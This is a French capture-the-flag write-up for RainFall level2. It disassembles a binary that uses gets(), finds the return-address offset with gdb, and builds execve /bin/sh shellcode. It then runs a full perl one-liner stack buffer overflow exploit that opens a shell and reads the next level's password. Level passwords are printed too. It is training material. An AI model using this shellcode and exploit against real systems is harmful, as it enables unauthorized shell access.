# level2 :

pass : `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`

```bash
level0@RainFall:~$ su level2
Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Source :

fonction `main`

```nasm
Dump of assembler code for function main:
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
```

```c
int		main(int ac, char **av, char **envp) {
	return(p());
}
```

fonction `p`

```nasm
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```

```c
p() {
    int var = fflush(FILE *stream); // trouver l'argument
    // var is save at [ebp-0x4c]
    char str[76];
    str = gets(str);

    if () {
        printf();
        exit(1);
    }
}
```

## Recherche :

```
level2@RainFall:~$ objdump -d level2 | grep "call $eax"
804835c:	e8 00 00 00 00       	call   8048361 <_init+0x9>
8048372:	e8 89 00 00 00       	call   8048400 <__gmon_start__@plt>
8048377:	e8 34 01 00 00       	call   80484b0 <frame_dummy>
804837c:	e8 4f 02 00 00       	call   80485d0 <__do_global_ctors_aux>
804843c:	e8 cf ff ff ff       	call   8048410 <__libc_start_main@plt>
8048488:	ff 14 85 50 97 04 08 	call   *0x8049750(,%eax,4)
80484cf:	ff d0                	call   *%eax
80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
8048545:	e8 8a ff ff ff       	call   80484d4 <p>
8048554:	e8 69 00 00 00       	call   80485c2 <__i686.get_pc_thunk.bx>
804856c:	e8 e7 fd ff ff       	call   8048358 <_init>
804859b:	ff 94 b3 20 ff ff ff 	call   *-0xe0(%ebx,%esi,4)
80485eb:	ff d0                	call   *%eax
8048600:	e8 00 00 00 00       	call   8048605 <_fini+0x9>
804860c:	e8 3f fe ff ff       	call   8048450 <__do_global_dtors_aux>
```
Donc l'addresse `80484cf` fait un call au register EAX. Et en little endian : `\xcf\x84\x04\x08`

```gdb
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x804a008 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EBX: 0xb7fd0ff4 --> 0x1a4d7c
ECX: 0x0
EDX: 0xbffff69c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
ESI: 0x0
EDI: 0x0
EBP: 0x41344141 ('AA4A')
ESP: 0xbffff6f0 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41414a41 ('AJAA')
EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414a41
[------------------------------------stack-------------------------------------]
0000| 0xbffff6f0 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xbffff6f4 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xbffff6f8 ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xbffff6fc ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xbffff700 ("AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xbffff704 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xbffff708 ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xbffff70c ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414a41 in ?? ()
gdb-peda$ pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 80
EBP+0 found at offset: 76
Registers point to pattern buffer:
[EAX] --> offset 0 - size ~200
[EDX] --> offset 0 - size ~200
[ESP] --> offset 84 - size ~116
Pattern buffer found at:
0x0804a04b : offset   67 - size  133 ([heap])
0xb7fd9043 : offset   67 - size  133 (mapped)
0xb7fda000 : offset    0 - size  200 (mapped)
0xbffff6df : offset   67 - size  133 ($sp + -0x11 [-5 dwords])
References to pattern buffer found at:
0xb7fd1acc : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
0xb7fd1ad0 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
0xb7fd1ad4 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
0xb7fd1ad8 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
0xb7fd1adc : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
```

Donc `EIP` est réécrit à l'ofset 80.

Soit le code asm suivant permettant d'executer un `/bin/sh`:
```nasm
.global main
main:
    push   $0xb
    pop    %eax
    xor    %esi,%esi
    push   %esi
    push   $0x68732f2f
    push   $0x6e69622f
    mov    %esp,%ebx
    xor    %ecx,%ecx
    mov    %ecx,%edx
    int    $0x80
```
 qui compilé donne le shell code suivant :
`\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80`

## Exploit :

```bash
level2@RainFall:~$ (perl -e 'print "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"."\x90"x(80-24)."\xcf\x84\x04\x08"'; cat;) | ./level2
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_TERMINAL_VERSION = "3.3.7",
	LC_CTYPE = "UTF-8",
	LC_TERMINAL = "iTerm2",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").

 X1�Vh//shh/bin��1ɉ�̀����������������������������������������������������τ
whoami
level3
pwd
/home/user/level2
cd ../level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

On peut trouver sur internet des shell codes qui fonctionnent directement comme sur cette page :
http://shell-storm.org/shellcode/files/shellcode-811.php

`(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"."\x90"x(80-28)."\xcf\x84\x04\x08"'; cat;) | ./level2`

----

## Documentation :

* [0x0ff.info - BUFFER OVERFLOW & GDB – PART 1](https://www.0x0ff.info/2015/buffer-overflow-gdb-part1/)
* [0x0ff.info - BUFFER OVERFLOW & GDB – PART 2](https://www.0x0ff.info/2015/buffer-overflow-gdb-part-2/)
* [0x0ff.info - BUFFER OVERFLOW & GDB – PART 3](https://www.0x0ff.info/2015/buffer-overflow-gdb-part-3/)
* [NASM Tutorial](https://cs.lmu.edu/~ray/notes/nasmtutorial/)
* [hackndo - Buffer Overflow](https://beta.hackndo.com/buffer-overflow/)
![](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
